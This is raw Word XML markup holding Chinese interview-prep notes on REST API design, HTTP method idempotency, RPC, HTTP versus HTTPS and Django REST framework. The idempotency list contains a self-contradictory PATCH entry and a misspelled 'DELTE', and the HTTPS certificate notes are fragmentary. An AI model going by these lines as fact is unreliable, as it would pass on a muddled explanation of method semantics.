        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F4034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状态码</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>'200/300/400/500</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="362E8B4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'url</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中尽量使用名词</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>'restful</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>也可以称为</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面向资源编程</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A18CB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'api</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>标示</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9F25B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api.luffycity.com</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7471C2CC" w14:textId="4B12CF53"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www.luffycity.com/api/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0644E369" w14:textId="5DF095B9"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056</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接口的幂等性是什么意思？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD4D431" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="003942C2" w:rsidRDefault="003942C2" w:rsidP="003942C2">
      <w:pPr>
        <w:widowControl/>
        <w:pBdr>
          <w:top w:val="single" w:sz="6" w:space="11" w:color="CCCCCC"/>
          <w:left w:val="single" w:sz="6" w:space="11" w:color="CCCCCC"/>
          <w:bottom w:val="single" w:sz="6" w:space="11" w:color="CCCCCC"/>
          <w:right w:val="single" w:sz="6" w:space="1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Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>一个接口通过</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>次相同的访问，再对该接口进行</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>次相同的访问时，对资源不造影响就认为接口具有幂等性。</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EDD133F" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="003942C2" w:rsidRDefault="003942C2" w:rsidP="003942C2">
      <w:pPr>
        <w:widowControl/>
        <w:pBdr>
          <w:top w:val="single" w:sz="6" w:space="11" w:color="CCCCCC"/>
          <w:left w:val="single" w:sz="6" w:space="11" w:color="CCCCCC"/>
          <w:bottom w:val="single" w:sz="6" w:space="11" w:color="CCCCCC"/>
          <w:right w:val="single" w:sz="6" w:space="1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Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">    GET</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  #</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>第一次获取结果、第二次也是获取结果对资源都不会造成影响，幂等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1238419D" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="003942C2" w:rsidRDefault="003942C2" w:rsidP="003942C2">
      <w:pPr>
        <w:widowControl/>
        <w:pBdr>
          <w:top w:val="single" w:sz="6" w:space="11" w:color="CCCCCC"/>
          <w:left w:val="single" w:sz="6" w:space="11" w:color="CCCCCC"/>
          <w:bottom w:val="single" w:sz="6" w:space="11" w:color="CCCCCC"/>
          <w:right w:val="single" w:sz="6" w:space="1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Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">    POST</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> #</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>第一次新增数据，第二次也会再次新增，非幂等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1339E2D4" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="003942C2" w:rsidRDefault="003942C2" w:rsidP="003942C2">
      <w:pPr>
        <w:widowControl/>
        <w:pBdr>
          <w:top w:val="single" w:sz="6" w:space="11" w:color="CCCCCC"/>
          <w:left w:val="single" w:sz="6" w:space="11" w:color="CCCCCC"/>
          <w:bottom w:val="single" w:sz="6" w:space="11" w:color="CCCCCC"/>
          <w:right w:val="single" w:sz="6" w:space="1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Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">    PUT</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  #</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>第一次更新数据，第二次不会再次更新，幂等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EBF9ABC" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="003942C2" w:rsidRDefault="003942C2" w:rsidP="003942C2">
      <w:pPr>
        <w:widowControl/>
        <w:pBdr>
          <w:top w:val="single" w:sz="6" w:space="11" w:color="CCCCCC"/>
          <w:left w:val="single" w:sz="6" w:space="11" w:color="CCCCCC"/>
          <w:bottom w:val="single" w:sz="6" w:space="11" w:color="CCCCCC"/>
          <w:right w:val="single" w:sz="6" w:space="1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Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">    PATCH</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>第一次更新数据，第二次不会再次更新，非幂等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16882428" w14:textId="16CA2C1F" w:rsidR="003942C2" w:rsidRPr="003942C2" w:rsidRDefault="003942C2" w:rsidP="003942C2">
      <w:pPr>
        <w:widowControl/>
        <w:pBdr>
          <w:top w:val="single" w:sz="6" w:space="11" w:color="CCCCCC"/>
          <w:left w:val="single" w:sz="6" w:space="11" w:color="CCCCCC"/>
          <w:bottom w:val="single" w:sz="6" w:space="11" w:color="CCCCCC"/>
          <w:right w:val="single" w:sz="6" w:space="1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Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">    DELTE</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r w:rsidRPr="003942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>第一次删除数据，第二次不在再删除，幂等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FDFDB6F" w14:textId="1EA4E20E"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057</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什么是</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>RPC</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49F2276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远程过程调用协议</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69DECB2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是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="232543A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进化的顺序</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现有的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>RPC,</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>然后有的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>RESTful</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>规范</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C7AA9D" w14:textId="5B63934F"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058</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Http</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Https</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13E9399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#Http: 80</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>端口</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7552B60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#https: 443</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>端口</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="011D635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http</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>信息是明文传输，</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>https</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>则是具有安全性的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ssl</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>加密传输协议。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F79AB5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自定义证书</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59AF308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服务端：创建一对证书</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30E57D0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客户端：必须携带证书</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EF9D15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购买证书</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00E14DC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服务端：</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创建一对证书，。。。。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E727EB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客户端：</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去机构获取证书，数据加密后发给咱们的服务单</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="726D2E4A" w14:textId="05417D86"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 </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>证书机构</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公钥给改机构</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D2AAC71" w14:textId="0EFAFA98"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059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为什么要使用</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>django rest framework</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>框架？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1926553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在编写接口时可以不使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django rest framework</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>框架，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA0546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不使用：也可以做，可以用</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>CBV</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>来实现，开发者编写的代码会更多一些。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D203E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使用：内部帮助我们提供了很多方便的组件，我们通过配置就可以完成相应操作，如：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EED6A2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序列化</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可以做用户请求数据校验</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>+queryset</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象的序列化称为</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="250DFF7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解析器</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获取用户请求数据</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>request.data</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，会自动根据</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>content-type</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
